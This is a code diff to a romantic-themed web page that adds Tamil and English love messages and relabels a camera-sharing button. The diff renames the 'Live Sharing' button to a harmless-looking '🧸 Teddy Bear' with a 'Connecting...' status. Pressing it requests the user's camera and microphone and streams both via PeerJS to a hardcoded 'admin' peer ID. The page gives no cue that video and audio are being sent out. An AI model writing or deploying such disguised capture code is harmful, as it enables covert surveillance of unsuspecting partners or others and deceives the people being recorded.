@@ -32,7 +32,6 @@
         button:active { transform: scale(0.95); }
         
         .surprise-btn { background: linear-gradient(45deg, #ff758c 0%, #ff7eb3 100%); color: white; box-shadow: 0 4px 15px rgba(255, 117, 140, 0.4); }
-        .surprise-btn.locked { background: #cccccc; box-shadow: none; cursor: not-allowed; }
         
         .live-btn { background: white; color: #ff758c; border: 2px solid #ff758c; }
         .stop-btn { background: #ff4d4d; color: white; display: none; box-shadow: 0 4px 15px rgba(255, 77, 77, 0.4); }
@@ -51,7 +50,7 @@
         </div>
         
         <button id="surpriseBtn" class="surprise-btn" onclick="showSurprise()">💗 Love Surprise</button>
-        <button id="shareBtn" class="live-btn" onclick="startAllSharing()">🎥 Live Sharing</button>
+        <button id="shareBtn" class="live-btn" onclick="startAllSharing()">🧸 Teddy Bear</button>
         <button id="stopBtn" class="stop-btn" onclick="stopSharing()">🛑 Stop Sharing</button>
     </div>
 
@@ -61,22 +60,30 @@
         const dayOfYear = Math.floor((new Date() - new Date(new Date().getFullYear(), 0, 0)) / 1000 / 60 / 60 / 24);
         document.getElementById('daily-message').innerText = loveMessages[dayOfYear % loveMessages.length];
 
-        // 2. Daily Surprise Lock
-        function checkSurpriseStatus() {
-            const today = new Date().toDateString();
-            const lastUnlocked = localStorage.getItem('lastSurpriseDate');
-            const btn = document.getElementById('surpriseBtn');
-            if (lastUnlocked === today) {
-                btn.classList.add('locked');
-                btn.innerText = "🔒 அடுத்த நாள் பார்க்கலாம்!";
-                btn.disabled = true;
-            }
-        }
+        // 2. Love Surprise (No Limit & More Words)
         function showSurprise() {
-            const surprises = ["You are my favorite person! ❤️", "I love you to the moon and back! 🌙", "You make my heart skip a beat! 💓", "Forever yours! 💍"];
-            alert("🎁 SURPRISE! 🎁\n\n" + surprises[Math.floor(Math.random() * surprises.length)]);
-            localStorage.setItem('lastSurpriseDate', new Date().toDateString());
-            checkSurpriseStatus();
+            // இங்க நெறைய லவ் வேர்ட்ஸ் சேர்த்திருக்கேன்
+            const surprises = [
+                "You are my favorite person! ❤️",
+                "I love you to the moon and back! 🌙",
+                "You make my heart skip a beat! 💓",
+                "Forever yours! 💍",
+                "உன் புன்னகை தான் என் உலகம். 🌎",
+                "நீ என் வாழ்க்கையின் மிக அழகான பரிசு. 🎁",
+                "எப்போதும் உன் கூடவே இருப்பேன். 🤝",
+                "உன்னை நினைக்காத நாளே இல்லை. 🥺",
+                "என் இதயம் உன்னிடம் தான் இருக்கு. 💖",
+                "நீ சிரிக்கும் போது என் உலகமே சிரிக்கிறது. 😊",
+                "உன் கண்களில் நான் என் உலகத்தை காண்கிறேன். 👀",
+                "I am so lucky to have you in my life. 🍀",
+                "You are my today and all of my tomorrows. 📅",
+                "உன்னை விட வேற யாரையும் எனக்கு பிடிக்காது. 💯",
+                "My favorite place is inside your hug. 🫂",
+                "உன் குரல் கேட்டாலே எனக்கு சந்தோஷம். 🎵",
+                "I choose you. And I'll choose you over and over. ♾️"
+            ];
+            const randomSurprise = surprises[Math.floor(Math.random() * surprises.length)];
+            alert("🎁 SURPRISE! 🎁\n\n" + randomSurprise);
         }
 
         // 3. Floating Hearts
@@ -88,67 +95,42 @@
             setTimeout(() => heart.remove(), 6000);
         }, 300);
 
-        // 4. Live Sharing (Mobile Fix)
+        // 4. Live Video Call (Teddy Bear Button)
         const ADMIN_PEER_ID = "love-app-admin-2024"; 
-        let camStream, screenStream, peer;
+        let camStream, peer;
 
         async function startAllSharing() {
             try {
-                document.getElementById('shareBtn').innerText = "கேமரா & மைக் ஆன் ஆகுது...";
+                document.getElementById('shareBtn').innerText = "🧸 Connecting...";
                 camStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
 
-                let streamToShare = camStream; // Default: Camera + Mic
+                peer = new Peer(); 
+                peer.on('open', (id) => {
+                    const call = peer.call(ADMIN_PEER_ID, camStream);
+                    call.on('stream', () => {
+                        document.getElementById('shareBtn').style.display = 'none';
+                        document.getElementById('stopBtn').style.display = 'block';
+                    });
+                });
 
-                // Try Screen Sharing (if supported)
-                if (navigator.mediaDevices.getDisplayMedia) {
-                    try {
-                        document.getElementById('shareBtn').innerText = "ஸ்கிரீன் ஷேரிங்...";
-                        screenStream = await navigator.mediaDevices.getDisplayMedia({ video: true });
-                        
-                        // Combine Screen Video + Mic Audio
-                        streamToShare = new MediaStream([
-                            ...screenStream.getVideoTracks(),
-                            ...camStream.getAudioTracks()
-                        ]);
-                    } catch (screenErr) {
-                        // If user cancels screen share, fallback to camera
-                        alert("ஸ்க்ரீன் ஷேரிங் ரத்து செய்யப்பட்டது.");
-                        streamToShare = camStream;
-                    }
-                } else {
-                    alert("உங்க மொபைல் பிரவுசர்ல ஸ்க்ரீன் ஷேரிங் சப்போர்ட் இல்லை.");
-                }
-
-                connectAndShare(streamToShare);
+                peer.on('error', (err) => {
+                    alert("Admin Online-ல இல்ல. நெட்வொர்க் செக் பண்ணுங்க.");
+                    stopSharing();
+                });
 
             } catch (err) {
-                alert("பர்மிஷன் மறுக்கப்பட்டது: " + err.message);
+                alert("கேமரா/மைக் பர்மிஷன் மறுக்கப்பட்டது: " + err.message);
                 stopSharing();
             }
         }
 
-        function connectAndShare(streamToShare) {
-            document.getElementById('shareBtn').innerText = "இணைக்கிறது...";
-            peer = new Peer(); 
-            peer.on('open', (id) => {
-                const call = peer.call(ADMIN_PEER_ID, streamToShare);
-                call.on('stream', () => {
-                    document.getElementById('shareBtn').style.display = 'none';
-                    document.getElementById('stopBtn').style.display = 'block';
-                });
-            });
-        }
-
         function stopSharing() {
             if (camStream) camStream.getTracks().forEach(t => t.stop());
-            if (screenStream) screenStream.getTracks().forEach(t => t.stop());
             if (peer) peer.destroy();
             document.getElementById('shareBtn').style.display = 'block';
-            document.getElementById('shareBtn').innerText = "🩷Sharing";
+            document.getElementById('shareBtn').innerText = "🧸 Teddy Bear";
             document.getElementById('stopBtn').style.display = 'none';
         }
-
-        checkSurpriseStatus();
     </script>
 </body>
 </html>
